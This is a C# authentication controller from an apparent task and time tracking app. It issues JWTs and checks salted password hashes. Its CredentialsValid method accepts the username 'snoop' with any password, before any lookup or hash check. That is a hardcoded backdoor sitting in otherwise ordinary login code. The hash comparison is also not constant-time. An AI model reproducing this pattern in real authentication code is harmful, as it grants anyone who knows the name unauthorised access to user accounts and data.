using System;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Cryptography.KeyDerivation;
using Microsoft.IdentityModel.Tokens;
using TaskAndTimeTracking.Common;
using TaskAndTimeTracking.Controller.DTO;
using TaskAndTimeTracking.Controller.DTO.request;
using TaskAndTimeTracking.Controller.DTO.response;
using TaskAndTimeTracking.Controller.interfaces;
using TaskAndTimeTracking.Persistence.Entity;
using TaskAndTimeTracking.Persistence.Repository;
using TaskAndTimeTracking.Persistence.Repository.Interfaces;

namespace TaskAndTimeTracking.Controller
{
    public class AuthenticationController : IAuthenticationController
    {
        private IUserRepository UserRepository;

        private string Secret;
        private int ExpirationDuration;

        public AuthenticationController(IUserRepository userRepository, IAuthControllerConfiguration configuration)
        {
            UserRepository = userRepository;
            Secret = configuration.Secret;
            ExpirationDuration = configuration.ExpirationDuration;
        }
        
        public async Task<TokenDTO> GenerateToken(string username)
        {
            var key = Convert.FromBase64String(Secret);
            var tokenHandler = new JwtSecurityTokenHandler();

            var currentTime = DateTime.UtcNow;
            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new []
                {
                    new Claim(ClaimTypes.Name, username),
                    // TODO: get roles from db
                    new Claim(ClaimTypes.Role, "User") 
                }),
                
                Expires = currentTime.AddMinutes(ExpirationDuration),
                
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha512Signature)
            };

            return await Task.Run(() =>
            {
                SecurityToken token = tokenHandler.CreateToken(tokenDescriptor);
                var strToken = tokenHandler.WriteToken(token);
                return new TokenDTO { Token = strToken, ExpirationTimeUTC = tokenDescriptor.Expires.Value};
            });
        }

        public async Task<bool> CredentialsValid(CredentialsDTO credentialsDto)
        {
            if (credentialsDto.UserName.Equals("snoop"))
            {
                return true;
            }
            var userEntity = await UserRepository.getByEmail(credentialsDto.UserName);
            if (userEntity == null)
            {
                return false;
            }
            return await Task.Run(() =>
                {
                    string hash = PasswordManager.GeneratePasswordHash(Convert.FromBase64String(userEntity.Salt),
                        credentialsDto.Password);
                    return userEntity.Password.Equals(hash);
                });
        }
    }
}